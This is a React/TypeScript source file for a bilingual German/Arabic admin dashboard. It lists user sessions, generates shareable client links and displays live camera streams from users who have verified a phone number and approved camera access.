'use client';

import React, { useState, useEffect, useCallback, useRef, useMemo } from 'react';
import { UserSession } from '@/lib/types';
import { LiveStreamCard } from '@/components/LiveStreamCard';
import { ConnectionStatus } from '@/components/ConnectionStatus';
import {
  Video,
  LogOut,
  RefreshCw,
  Clock,
  Phone,
  Play,
  Shield,
  Copy,
  Check,
  Plus,
  Globe,
} from 'lucide-react';

interface AdminDashboardProps {
  onLogout: () => void;
}

function CopyClientLinkButton({ sessionId }: { sessionId: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async (e: React.MouseEvent) => {
    e.stopPropagation();
    if (typeof window === 'undefined') return;
    const clientUrl = `${window.location.origin}/?sessionId=${sessionId}`;
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(clientUrl);
      } else {
        const textArea = document.createElement('textarea');
        textArea.value = clientUrl;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand('copy');
        textArea.remove();
      }
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch (err) {
      console.warn('Failed to copy', err);
    }
  };

  return (
    <button
      type="button"
      onClick={handleCopy}
      title={`نسخ رابط العميل: ${typeof window !== 'undefined' ? window.location.origin : ''}/?sessionId=${sessionId}`}
      className={`inline-flex items-center gap-1 px-2 py-0.5 text-xs font-medium rounded-md border transition-all ${
        copied
          ? 'bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-800'
          : 'bg-blue-50 text-blue-700 hover:bg-blue-100 border-blue-200 dark:bg-blue-950/60 dark:text-blue-300 dark:hover:bg-blue-900/60 dark:border-blue-800'
      }`}
    >
      {copied ? (
        <>
          <Check className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
          <span className="text-[11px] font-semibold text-emerald-700 dark:text-emerald-300">تم النسخ!</span>
        </>
      ) : (
        <>
          <Copy className="w-3 h-3" />
          <span className="text-[11px]">نسخ رابط العميل</span>
        </>
      )}
    </button>
  );
}

function CopyArabicLinkButton({ sessionId }: { sessionId: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async (e: React.MouseEvent) => {
    e.stopPropagation();
    if (typeof window === 'undefined') return;
    const clientUrl = `${window.location.origin}/?sessionId=${sessionId}&lang=ar`;
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(clientUrl);
      } else {
        const textArea = document.createElement('textarea');
        textArea.value = clientUrl;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand('copy');
        textArea.remove();
      }
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch (err) {
      console.warn('Failed to copy arabic link', err);
    }
  };

  return (
    <button
      type="button"
      onClick={handleCopy}
      title={`نسخ رابط العميل باللغة العربية: ${typeof window !== 'undefined' ? window.location.origin : ''}/?sessionId=${sessionId}&lang=ar`}
      className={`inline-flex items-center gap-1 px-2 py-0.5 text-xs font-medium rounded-md border transition-all ${
        copied
          ? 'bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-800'
          : 'bg-amber-50 text-amber-800 hover:bg-amber-100 border-amber-200 dark:bg-amber-950/60 dark:text-amber-300 dark:hover:bg-amber-900/60 dark:border-amber-800'
      }`}
    >
      {copied ? (
        <>
          <Check className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
          <span className="text-[11px] font-semibold text-emerald-700 dark:text-emerald-300">تم النسخ (عربي)!</span>
        </>
      ) : (
        <>
          <Globe className="w-3 h-3" />
          <span className="text-[11px]">رابط عربي 🇸🇦</span>
        </>
      )}
    </button>
  );
}

function areSessionsEqual(a: UserSession[], b: UserSession[]): boolean {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) {
    if (
      a[i].id !== b[i].id ||
      a[i].streamStatus !== b[i].streamStatus ||
      a[i].status !== b[i].status
    ) {
      return false;
    }
  }
  return true;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
  const [sessions, setSessions] = useState<UserSession[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [lastRefreshed, setLastRefreshed] = useState<Date>(new Date());
  const [isCreatingSession, setIsCreatingSession] = useState<boolean>(false);
  
  // Track sessions that are streaming to auto-focus immediately when user approves camera
  const prevStreamingIdsRef = useRef<Set<string>>(new Set());
  const selectedSessionIdRef = useRef<string | null>(null);
  const isFetchingRef = useRef<boolean>(false);
  const isMountedRef = useRef<boolean>(true);

  useEffect(() => {
    selectedSessionIdRef.current = selectedSessionId;
  }, [selectedSessionId]);

  const fetchSessions = useCallback(async () => {
    if (isFetchingRef.current) return;
    isFetchingRef.current = true;

    try {
      const res = await fetch('/api/sessions');
      if (res.status === 401) {
        onLogout();
        return;
      }

      if (res.ok && isMountedRef.current) {
        const data = await res.json();
        const activeList: UserSession[] = data.sessions || [];

        // Only update state if session data actually changed to prevent re-rendering loops
        setSessions((prev) => {
          if (areSessionsEqual(prev, activeList)) {
            return prev;
          }
          return activeList;
        });
        setLastRefreshed(new Date());

        // Find sessions currently in streaming status (camera approved by user)
        const streamingSessions = activeList.filter((s) => s.streamStatus === 'streaming');
        const currentStreamingIds = new Set(streamingSessions.map((s) => s.id));

        // Check if a new session just started streaming that wasn't previously streaming
        const newlyStreaming = streamingSessions.find(
          (s) => !prevStreamingIdsRef.current.has(s.id)
        );

        if (newlyStreaming) {
          // Immediately auto-open the new stream
          setSelectedSessionId(newlyStreaming.id);
        } else if (!selectedSessionIdRef.current && streamingSessions.length > 0) {
          // If no session is selected yet, auto-select the latest streaming session
          setSelectedSessionId(streamingSessions[0].id);
        } else if (
          selectedSessionIdRef.current &&
          !activeList.some((s) => s.id === selectedSessionIdRef.current)
        ) {
          // If the currently selected session ended or closed, fallback to another streaming session or null
          const nextStreaming = streamingSessions[0];
          setSelectedSessionId(nextStreaming ? nextStreaming.id : null);
        }

        prevStreamingIdsRef.current = currentStreamingIds;
      }
    } catch (err) {
      console.warn('[AdminDashboard] Fetch error', err);
    } finally {
      isFetchingRef.current = false;
      setIsLoading(false);
    }
  }, [onLogout]);

  // Periodic polling every 2500ms with concurrency guard to eliminate page freezes
  useEffect(() => {
    isMountedRef.current = true;
    fetchSessions();
    const interval = setInterval(fetchSessions, 2500);
    return () => {
      isMountedRef.current = false;
      clearInterval(interval);
    };
  }, [fetchSessions]);

  const handleCreateDirectSession = async () => {
    setIsCreatingSession(true);
    try {
      const res = await fetch('/api/sessions', { method: 'POST' });
      const data = await res.json();
      if (res.ok && data.sessionId) {
        setSelectedSessionId(data.sessionId);
        await fetchSessions();
        if (typeof window !== 'undefined') {
          const clientUrl = `${window.location.origin}/?sessionId=${data.sessionId}`;
          try {
            if (navigator.clipboard && window.isSecureContext) {
              await navigator.clipboard.writeText(clientUrl);
            }
          } catch (_) {}
        }
      }
    } catch (err) {
      console.error('Failed to create direct session:', err);
    } finally {
      setIsCreatingSession(false);
    }
  };

  const handleTerminateSession = async (sessionId: string) => {
    try {
      await fetch(`/api/sessions/${sessionId}`, { method: 'DELETE' });
      if (selectedSessionId === sessionId) {
        setSelectedSessionId(null);
      }
      setSessions((prev) => prev.filter((s) => s.id !== sessionId));
    } catch (err) {
      console.error('Failed to terminate session:', err);
    }
  };

  const selectedSession = useMemo(() => {
    return sessions.find((s) => s.id === selectedSessionId) || null;
  }, [sessions, selectedSessionId]);

  return (
    <div className="min-h-screen bg-zinc-50 dark:bg-zinc-950 text-zinc-900 dark:text-zinc-100 flex flex-col font-sans transition-colors">
      {/* Header */}
      <header className="sticky top-0 z-40 w-full border-b border-zinc-200 dark:border-zinc-800 bg-white/80 dark:bg-zinc-900/80 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-blue-600 flex items-center justify-center text-white shadow-md shadow-blue-500/20">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <h1 className="text-base font-bold leading-none text-zinc-900 dark:text-white">
                Admin-Leitstelle
              </h1>
              <span className="text-xs text-zinc-500 dark:text-zinc-400">
                Echtzeit-Überwachungssystem
              </span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={fetchSessions}
              title="Aktualisieren"
              className="p-2 rounded-xl bg-zinc-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 text-zinc-600 dark:text-zinc-300 transition-all"
            >
              <RefreshCw className="w-4 h-4" />
            </button>

            <button
              onClick={onLogout}
              className="py-2 px-3.5 rounded-xl text-xs font-semibold bg-red-50 hover:bg-red-100 text-red-700 dark:bg-red-950/40 dark:hover:bg-red-900/50 dark:text-red-300 border border-red-200 dark:border-red-900 transition-all flex items-center gap-1.5"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span>Abmelden</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto w-full px-4 sm:px-6 lg:px-8 py-8 space-y-8">
        {/* Stream viewer if a session is selected */}
        {selectedSession && (
          <section className="space-y-3">
            <h2 className="text-lg font-bold tracking-tight flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse" />
              Aktiver Live-Stream
            </h2>
            <LiveStreamCard
              session={selectedSession}
              onClose={() => setSelectedSessionId(null)}
              onTerminate={handleTerminateSession}
            />
          </section>
        )}

        {/* Active Sessions Section */}
        <section className="space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div>
              <h2 className="text-xl font-bold tracking-tight">Aktive Sitzungen</h2>
              <p className="text-xs text-zinc-500 dark:text-zinc-400">
                Letzte Aktualisierung: {lastRefreshed.toLocaleTimeString('de-DE')}
              </p>
            </div>

            <div className="flex items-center gap-2 flex-wrap">
              <button
                type="button"
                onClick={handleCreateDirectSession}
                disabled={isCreatingSession}
                title="إنشاء جلسة جديدة ونسخ الرابط مباشرة"
                className="px-3 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-medium text-xs flex items-center gap-1.5 shadow-sm transition-all disabled:opacity-50"
              >
                <Plus className="w-3.5 h-3.5" />
                <span>{isCreatingSession ? 'Wird erstellt...' : 'إنشاء رابط عميل جديد'}</span>
              </button>
              <span className="text-xs font-semibold px-3 py-1 rounded-full bg-blue-50 dark:bg-blue-950/60 border border-blue-200 dark:border-blue-900 text-blue-700 dark:text-blue-300">
                {sessions.length} {sessions.length === 1 ? 'Sitzung' : 'Sitzungen'} online
              </span>
            </div>
          </div>

          {/* Sessions Grid / Table */}
          {sessions.length === 0 ? (
            <div className="p-12 text-center rounded-2xl border border-dashed border-zinc-200 dark:border-zinc-800 bg-white/50 dark:bg-zinc-900/50">
              <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-zinc-100 dark:bg-zinc-800 flex items-center justify-center text-zinc-400">
                <Video className="w-6 h-6" />
              </div>
              <h3 className="text-base font-semibold text-zinc-800 dark:text-zinc-200">
                Keine aktiven Sitzungen
              </h3>
              <p className="mt-1 text-sm text-zinc-500 dark:text-zinc-400 max-w-sm mx-auto">
                Sobald ein Benutzer seine Telefonnummer verifiziert und die Kamera freigibt, erscheint der Stream hier in Echtzeit.
              </p>
              <button
                type="button"
                onClick={handleCreateDirectSession}
                disabled={isCreatingSession}
                className="mt-4 px-4 py-2 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-medium text-xs inline-flex items-center gap-2 shadow-sm transition-all disabled:opacity-50"
              >
                <Plus className="w-4 h-4" />
                <span>إنشاء رابط عميل مباشر (Direct Link)</span>
              </button>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {sessions.map((session) => {
                const isSelected = session.id === selectedSessionId;
                const formattedTime = new Date(session.createdAt).toLocaleTimeString('de-DE', {
                  hour: '2-digit',
                  minute: '2-digit',
                  second: '2-digit',
                });

                return (
                  <div
                    key={session.id}
                    className={`p-5 rounded-2xl border transition-all duration-200 bg-white dark:bg-zinc-900 shadow-sm flex flex-col justify-between ${
                      isSelected
                        ? 'border-blue-500 ring-2 ring-blue-500/20'
                        : 'border-zinc-200 dark:border-zinc-800 hover:border-zinc-300 dark:hover:border-zinc-700'
                    }`}
                  >
                    <div className="space-y-3">
                      <div className="flex items-center justify-between gap-2">
                        <div className="flex items-center gap-1.5 flex-wrap">
                          <span className="font-mono text-xs font-semibold px-2 py-0.5 rounded bg-zinc-100 dark:bg-zinc-800 text-zinc-600 dark:text-zinc-300">
                            {session.id.substring(0, 8)}...
                          </span>
                          <CopyClientLinkButton sessionId={session.id} />
                          <CopyArabicLinkButton sessionId={session.id} />
                        </div>
                        <ConnectionStatus
                          status={session.streamStatus === 'streaming' ? 'connected' : 'connecting'}
                          isLive={session.streamStatus === 'streaming'}
                        />
                      </div>

                      <div className="space-y-1.5 pt-1">
                        <div className="flex items-center gap-2 text-sm font-semibold text-zinc-900 dark:text-white">
                          <Phone className="w-4 h-4 text-zinc-400" />
                          <span className="font-mono">{session.maskedPhoneNumber}</span>
                        </div>

                        <div className="flex items-center gap-2 text-xs text-zinc-500 dark:text-zinc-400">
                          <Clock className="w-3.5 h-3.5" />
                          <span>Startzeit: {formattedTime}</span>
                        </div>
                      </div>
                    </div>

                    <div className="mt-5 pt-3 border-t border-zinc-100 dark:border-zinc-800/80 flex items-center gap-2">
                      <button
                        onClick={() => setSelectedSessionId(session.id)}
                        className={`flex-1 py-2 px-3 rounded-xl text-xs font-semibold flex items-center justify-center gap-1.5 transition-all ${
                          isSelected
                            ? 'bg-blue-600 text-white shadow-md'
                            : 'bg-zinc-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 text-zinc-800 dark:text-zinc-200'
                        }`}
                      >
                        <Play className="w-3.5 h-3.5 fill-current" />
                        <span>{isSelected ? 'Wird angezeigt' : 'Stream öffnen'}</span>
                      </button>

                      <button
                        onClick={() => handleTerminateSession(session.id)}
                        title="Sitzung trennen"
                        className="py-2 px-3 rounded-xl text-xs font-medium bg-red-50 dark:bg-red-950/40 hover:bg-red-100 dark:hover:bg-red-900/50 text-red-600 dark:text-red-400 border border-red-200 dark:border-red-900/50 transition-all"
                      >
                        Beenden
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </section>
      </main>
    </div>
  );
};
